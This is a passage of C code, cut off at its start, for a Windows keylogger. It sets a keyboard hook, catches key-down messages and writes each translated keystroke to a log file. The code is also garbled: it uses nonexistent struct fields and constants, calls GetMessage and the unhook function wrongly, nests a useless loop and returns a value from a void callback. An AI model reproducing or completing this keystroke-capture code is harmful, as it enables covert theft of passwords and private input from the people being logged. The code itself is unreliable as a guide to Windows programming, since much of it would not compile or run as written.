    if (!hook) {
        printf("Failed to set keyboard hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, hwnd)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            keyboard_event_handler(hwnd, hook, msg.uParam.wEvent, msg.wParam, msg.lParam);
        }
        TranslateCharacter(logFile, msg.uParam.wEvent);
        TranslateKeyboardscript(logFile, msg.uParam.wEvent);
        // Optional: Write to file here
        // ...
        while (GetMessage(&msg, hwnd)) {
            // Continue processing messages
        }
    }

    UnhookWindowsHook(hook);
    DestroyWindow(hwnd);
    fclose(logFile);
    return 0;
}

void CALLBACK keyboard_event_handler(HWND hwnd, HHOOK hhk, int nCode, UINT wParam, LPARAM lParam) {
    if (nCode == HCN_KEYDOWN) {
        int key = wParam;
        char ch;
        if (TranslateCharacter(&ch, key)) {
            // Write 'ch' to the log file
            fprintf(logFile, "%c", ch);
            fflush(logFile);
        }
    }
    return 0;
}
```

